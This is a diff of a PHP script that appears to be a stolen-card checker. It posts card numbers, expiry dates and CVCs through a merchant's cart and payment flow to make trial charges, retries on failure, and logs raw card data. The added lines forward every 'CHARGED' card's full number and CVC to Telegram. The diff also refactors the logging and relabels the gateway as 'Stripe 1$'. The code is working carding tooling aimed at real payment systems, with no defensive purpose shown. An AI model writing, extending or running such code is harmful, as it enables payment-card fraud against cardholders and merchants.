@@ -149,7 +149,7 @@ session_start([
 if (!isset($_SESSION['user']) || $_SESSION['user']['auth_provider'] !== 'telegram') {
     http_response_code(401);
     $errorMsg = ['status' => 'ERROR', 'message' => 'Forbidden Access', 'response' => 'Forbidden Access'];
-    file_put_contents(__DIR__ . '/paypal0.1$_debug.log', date('Y-m-d H:i:s') . ' Error 403: ' . json_encode($errorMsg) . PHP_EOL, FILE_APPEND);
+    log_message('Error 401: ' . json_encode($errorMsg));
     echo json_encode($errorMsg);
     exit;
 }
@@ -159,7 +159,7 @@ if (!isset($_SESSION['user']) || $_SESSION['user']['auth_provider'] !== 'telegra
 if (!$validation['valid']) {
     http_response_code(401);
     $errorMsg = ['status' => 'ERROR', 'message' => 'Invalid API Key', 'response' => 'Invalid API Key'];
-    file_put_contents(__DIR__ . '/paypal0.1$_debug.log', date('Y-m-d H:i:s') . ' Error 401: ' . json_encode($errorMsg) . PHP_EOL, FILE_APPEND);
+    log_message('Error 401: ' . json_encode($errorMsg));
     echo json_encode($errorMsg);
     exit;
 }
@@ -169,7 +169,7 @@ if (!$validation['valid']) {
 if ($providedApiKey !== $expectedApiKey) {
     http_response_code(401);
     $errorMsg = ['status' => 'ERROR', 'message' => 'Invalid API Key', 'response' => 'Invalid API Key'];
-    file_put_contents(__DIR__ . '/paypal0.1$_debug.log', date('Y-m-d H:i:s') . ' Error 401: ' . json_encode($errorMsg) . PHP_EOL, FILE_APPEND);
+    log_message('Error 401: ' . json_encode($errorMsg));
     echo json_encode($errorMsg);
     exit;
 }
@@ -177,13 +177,6 @@ if ($providedApiKey !== $expectedApiKey) {
 // Enable error reporting for debugging (disable in production)
 ini_set('display_errors', 0);
 error_reporting(E_ALL);
-
-// Optional file-based logging for debugging
- $log_file = __DIR__ . '/paypal0.1$_debug.log';
-function log_message($message) {
-    global $log_file;
-    file_put_contents($log_file, date('Y-m-d H:i:s') . " - $message\n", FILE_APPEND);
-}
 
 // Track sent notifications to prevent duplicates
  $sent_notifications = [];
@@ -254,7 +247,7 @@ function sendTelegramNotification($card_details, $status, $response, $originalAp
     $user_username = htmlspecialchars($_SESSION['user']['username'] ?? '', ENT_QUOTES, 'UTF-8');
     $user_profile_url = $user_username ? "https://t.me/" . str_replace('@', '', $user_username) : '#';
     $status_emoji = ($status === 'CHARGED') ? '🔥' : '✅';
-    $gateway = 'Paypal 0.1$'; // Hardcoded for this gateway
+    $gateway = 'Stripe 1$'; // Updated for this gateway
     $formatted_response = formatResponse($response);
 
     // Construct Telegram message
@@ -308,7 +301,7 @@ if (!isset($_POST['card']) || !is_array($_POST['card'])) {
 // Validate card details
 if (empty($cardNumber) || empty($expMonth) || empty($expYear) || empty($cvc)) {
     $errorMsg = ['status' => 'DECLINED', 'message' => 'Missing card details', 'response' => 'MISSING_CARD_DETAILS'];
-    file_put_contents(__DIR__ . '/stripe1_debug.log', date('Y-m-d H:i:s') . ' Error 400: ' . json_encode($errorMsg) . PHP_EOL, FILE_APPEND);
+    log_message('Error 400: ' . json_encode($errorMsg));
     echo json_encode($errorMsg);
     exit;
 }
@@ -319,8 +312,8 @@ if (strlen($expYear) == 2) {
 }
 
 // Log request details
- $logMsg = date('Y-m-d H:i:s') . ' Request: Card=' . $cardNumber . '|' . $expMonth . '|' . $expYear . '|' . $cvc . ', Headers=' . print_r(getallheaders(), true);
-file_put_contents(__DIR__ . '/stripe1_debug.log', $logMsg . PHP_EOL, FILE_APPEND);
+ $logMsg = 'Request: Card=' . $cardNumber . '|' . $expMonth . '|' . $expYear . '|' . $cvc . ', Headers=' . print_r(getallheaders(), true);
+log_message($logMsg);
 
 // Initialize cookie jar for session continuity
  $cookieJar = tempnam(sys_get_temp_dir(), 'cookies');
@@ -371,13 +364,13 @@ function fetchCartToken($cookieJar) {
 
     if ($cartHttpCode != 200 || !isset($cartResult['redirectUrlPath'])) {
         $errorMsg = $cartResult['error']['message'] ?? ($curlError ?: 'Failed to create new cart');
-        file_put_contents(__DIR__ . '/stripe1_debug.log', date('Y-m-d H:i:s') . ' Cart Error: ' . $errorMsg . PHP_EOL, FILE_APPEND);
+        log_message('Cart Error: ' . $errorMsg);
         return ['success' => false, 'message' => $errorMsg];
     }
 
     preg_match('/cartToken=([^&]+)/', $cartResult['redirectUrlPath'], $matches);
     if (!isset($matches[1])) {
-        file_put_contents(__DIR__ . '/stripe1_debug.log', date('Y-m-d H:i:s') . ' Error: Failed to extract cart token' . PHP_EOL, FILE_APPEND);
+        log_message('Error: Failed to extract cart token');
         return ['success' => false, 'message' => 'Unable to extract cart token'];
     }
 
@@ -462,7 +455,7 @@ if ($httpCode != 200 || !isset($apx['id'])) {
         'response' => $errorMsg,
         'payment_method_id' => null
     ];
-    file_put_contents(__DIR__ . '/stripe1_debug.log', date('Y-m-d H:i:s') . ' Payment Method Error: ' . json_encode($responseMsg) . PHP_EOL, FILE_APPEND);
+    log_message('Payment Method Error: ' . json_encode($responseMsg));
     echo json_encode($responseMsg);
     exit;
 }
@@ -575,7 +568,7 @@ if (!$cartResult['success']) {
         'response' => $cartResult['message'],
         'payment_method_id' => $pid
     ];
-    file_put_contents(__DIR__ . '/stripe1_debug.log', date('Y-m-d H:i:s') . ' Cart Error: ' . json_encode($responseMsg) . PHP_EOL, FILE_APPEND);
+    log_message('Cart Error: ' . json_encode($responseMsg));
     echo json_encode($responseMsg);
     exit;
 }
@@ -597,14 +590,19 @@ while ($retryCount < $maxRetries) {
             'response' => "CHARGED",
             'payment_method_id' => $pid
         ];
-        file_put_contents(__DIR__ . '/stripe1_debug.log', date('Y-m-d H:i:s') . ' Success: ' . json_encode($responseMsg) . PHP_EOL, FILE_APPEND);
+        log_message('Success: ' . json_encode($responseMsg));
+        
+        // Send Telegram notification for CHARGED status
+        $card_details = "$cardNumber|$expMonth|$expYear|$cvc";
+        sendTelegramNotification($card_details, 'CHARGED', $responseMsg['response']);
+        
         echo json_encode($responseMsg);
         exit;
     }
 
     // Handle specific errors
     if (isset($apx1['failureType']) && in_array($apx1['failureType'], ['CART_ALREADY_PURCHASED', 'CART_MISSING', 'STALE_USER_SESSION'])) {
-        file_put_contents(__DIR__ . '/stripe1_debug.log', date('Y-m-d H:i:s') . " Error: {$apx1['failureType']}, retrying with new cart token" . PHP_EOL, FILE_APPEND);
+        log_message("Error: {$apx1['failureType']}, retrying with new cart token");
         $cartResult = fetchCartToken($cookieJar);
         if (!$cartResult['success']) {
             $responseMsg = [
@@ -613,7 +611,7 @@ while ($retryCount < $maxRetries) {
                 'response' => $cartResult['message'],
                 'payment_method_id' => $pid
             ];
-            file_put_contents(__DIR__ . '/stripe1_debug.log', date('Y-m-d H:i:s') . ' Cart Error: ' . json_encode($responseMsg) . PHP_EOL, FILE_APPEND);
+            log_message('Cart Error: ' . json_encode($responseMsg));
             echo json_encode($responseMsg);
             exit;
         }
@@ -631,7 +629,7 @@ while ($retryCount < $maxRetries) {
         'response' => "PAYMENT_DECLINED [$errorMsg]",
         'payment_method_id' => $pid
     ];
-    file_put_contents(__DIR__ . '/stripe1_debug.log', date('Y-m-d H:i:s') . ' Error: ' . json_encode($responseMsg) . PHP_EOL, FILE_APPEND);
+    log_message('Error: ' . json_encode($responseMsg));
     echo json_encode($responseMsg);
     exit;
 }
@@ -644,6 +642,6 @@ unlink($cookieJar);
     'response' => "MAX_RETRIES_EXCEEDED $cardNumber|$expMonth|$expYear|$cvc",
     'payment_method_id' => $pid
 ];
-file_put_contents(__DIR__ . '/stripe1_debug.log', date('Y-m-d H:i:s') . ' Error: ' . json_encode($responseMsg) . PHP_EOL, FILE_APPEND);
+log_message('Error: ' . json_encode($responseMsg));
 echo json_encode($responseMsg);
 ?>
